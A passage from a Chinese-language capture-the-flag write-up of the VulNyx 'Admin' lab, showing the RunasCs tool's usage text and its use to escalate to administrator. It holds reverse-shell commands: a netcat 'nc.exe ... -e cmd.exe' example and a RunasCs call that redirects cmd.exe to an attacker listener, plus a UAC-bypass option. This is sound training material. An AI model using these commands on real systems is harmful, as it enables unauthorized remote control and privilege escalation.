+detection)</li>
+<li>Allows to specify the logon type, e.g. 8-NetworkCleartext logon
+(no <em>UAC</em> limitations)</li>
+<li>Allows to bypass UAC when an administrator password is known (flag
+--bypass-uac)</li>
+<li>Allows to create a process with the main thread impersonating the
+requested user (flag --remote-impersonation)</li>
+<li>Allows
+redirecting <em>stdin</em>, <em>stdout</em> and <em>stderr</em> to a
+remote host</li>
+<li>It's Open Source :)</li>
+</ul>
+<p><em>RunasCs</em> has an automatic detection to determine the best
+create process function for every contexts. Based on the process caller
+token permissions, it will use one of the create process function in the
+following preferred order:</p>
+<ol type="1">
+<li><code>CreateProcessAsUserW()</code></li>
+<li><code>CreateProcessWithTokenW()</code></li>
+<li><code>CreateProcessWithLogonW()</code></li>
+</ol>
+</blockquote>
+<p>简言之，在 A 用户下通过提供 B 用户的凭证可以创建运行 B
+用户权限的特定进程【提权】</p>
+<p>Usage</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">RunasCs v1.5 - @splinter_code</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">    RunasCs is an utility to run specific processes under a different user account</span><br><span class="line">    by specifying explicit credentials. In contrast to the default runas.exe <span class="built_in">command</span></span><br><span class="line">    it supports different logon types and CreateProcess* <span class="built_in">functions</span> to be used, depending</span><br><span class="line">    on your current permissions. Furthermore it allows input/output redirection (even</span><br><span class="line">    to remote hosts) and you can specify the password directly on the <span class="built_in">command</span> line.</span><br><span class="line"></span><br><span class="line">Positional arguments:</span><br><span class="line">    username                username of the user</span><br><span class="line">    password                password of the user</span><br><span class="line">    cmd                     commandline <span class="keyword">for</span> the process</span><br><span class="line"></span><br><span class="line">Optional arguments:</span><br><span class="line">    -d, --domain domain</span><br><span class="line">                            domain of the user, <span class="keyword">if</span> <span class="keyword">in</span> a domain.</span><br><span class="line">                            Default: <span class="string">&quot;&quot;</span></span><br><span class="line">    -f, --<span class="keyword">function</span> create_process_function</span><br><span class="line">                            CreateProcess <span class="keyword">function</span> to use. When not specified</span><br><span class="line">                            RunasCs determines an appropriate CreateProcess</span><br><span class="line">                            <span class="keyword">function</span> automatically according to your privileges.</span><br><span class="line">                            0 - CreateProcessAsUserW</span><br><span class="line">                            1 - CreateProcessWithTokenW</span><br><span class="line">                            2 - CreateProcessWithLogonW</span><br><span class="line">    -l, --logon-type logon_type</span><br><span class="line">                            the logon <span class="built_in">type</span> <span class="keyword">for</span> the token of the new process.</span><br><span class="line">                            Default: <span class="string">&quot;2&quot;</span> - Interactive</span><br><span class="line">    -t, --<span class="built_in">timeout</span> process_timeout</span><br><span class="line">                            the waiting time (<span class="keyword">in</span> ms) <span class="keyword">for</span> the created process.</span><br><span class="line">                            This will halt RunasCs <span class="keyword">until</span> the spawned process</span><br><span class="line">                            ends and sent the output back to the <span class="built_in">caller</span>.</span><br><span class="line">                            If you <span class="built_in">set</span> 0 no output will be retrieved and a</span><br><span class="line">                            background process will be created.</span><br><span class="line">                            Default: <span class="string">&quot;120000&quot;</span></span><br><span class="line">    -r, --remote host:port</span><br><span class="line">                            redirect stdin, stdout and stderr to a remote host.</span><br><span class="line">                            Using this option sets the process_timeout to 0.</span><br><span class="line">    -p, --force-profile</span><br><span class="line">                            force the creation of the user profile on the machine.</span><br><span class="line">                            This will ensure the process will have the</span><br><span class="line">                            environment variables correctly <span class="built_in">set</span>.</span><br><span class="line">                            WARNING: If non-existent, it creates the user profile</span><br><span class="line">                            directory <span class="keyword">in</span> the C:\Users folder.</span><br><span class="line">    -b, --bypass-uac</span><br><span class="line">                            try a UAC bypass to spawn a process without</span><br><span class="line">                            token limitations (not filtered).</span><br><span class="line">    -i, --remote-impersonation</span><br><span class="line">                            spawn a new process and assign the token of the</span><br><span class="line">                            logged on user to the main thread.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    Run a <span class="built_in">command</span> as a <span class="built_in">local</span> user</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span></span><br><span class="line">    Run a <span class="built_in">command</span> as a domain user and logon <span class="built_in">type</span> as NetworkCleartext (8)</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span> -d domain -l 8</span><br><span class="line">    Run a background process as a <span class="built_in">local</span> user,</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;</span> -t 0</span><br><span class="line">    Redirect stdin, stdout and stderr of the specified <span class="built_in">command</span> to a remote host</span><br><span class="line">        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444</span><br><span class="line">    Run a <span class="built_in">command</span> simulating the /netonly flag of runas.exe</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span> -l 9</span><br><span class="line">    Run a <span class="built_in">command</span> as an Administrator bypassing UAC</span><br><span class="line">        RunasCs.exe adm1 password1 <span class="string">&quot;cmd /c whoami /priv&quot;</span> --bypass-uac</span><br><span class="line">    Run a <span class="built_in">command</span> as an Administrator through remote impersonation</span><br><span class="line">        RunasCs.exe adm1 password1 <span class="string">&quot;cmd /c echo admin &gt; C:\Windows\admin&quot;</span> -l 8 --remote-impersonation</span><br></pre></td></tr></table></figure>
+<p>Kali 开个监听，利用 RunasCs 往 Kali 重定向个 cmd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\hope&gt; C:\Users\hope\RunasCs.exe administrator SuperAdministrator123 cmd.exe -r 10.0.3.28:53</span><br><span class="line">[*] Warning: The logon <span class="keyword">for</span> user <span class="string">&#x27;administrator&#x27;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="string">&#x27;8&#x27;</span> to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session 0 with process <span class="keyword">function</span> CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-24f8f2$\Default</span><br><span class="line">[+] Async process <span class="string">&#x27;C:\Windows\system32\cmd.exe&#x27;</span> with pid 4080 created <span class="keyword">in</span> background.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>效果</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412161743705.jpg" /></p>
+<p>前面基于 hope 的 Shell</p>
+<p><strong>注</strong>，第 6 步获得的 Shell 可以查到系统管理员
+administrator ，但不要尝试 SMB
+爆破该用户，该用户会锁，会影响后续操作</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412161830750.jpg" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Admin/" title="VulNyx - Admin">https://z9m8r8.github.io/2024/12/16/VulNyx - Admin/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/SMB/" rel="tag"><i class="fa fa-tag"></i> SMB</a>
+              <a href="/tags/crackmapexec/" rel="tag"><i class="fa fa-tag"></i> crackmapexec</a>
+              <a href="/tags/RunasCs/" rel="tag"><i class="fa fa-tag"></i> RunasCs</a>
+              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
+              <a href="/tags/WinRM/" rel="tag"><i class="fa fa-tag"></i> WinRM</a>
+              <a href="/tags/Evil-Winrm/" rel="tag"><i class="fa fa-tag"></i> Evil-Winrm</a>
+              <a href="/tags/VulNyx/" rel="tag"><i class="fa fa-tag"></i> VulNyx</a>
+              <a href="/tags/winPEAS/" rel="tag"><i class="fa fa-tag"></i> winPEAS</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/12/13/Stapler%201/" rel="prev" title="VulnHub - Stapler: 1">
+                  <i class="fa fa-angle-left"></i> VulnHub - Stapler: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">336k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">20:24</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Admin/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
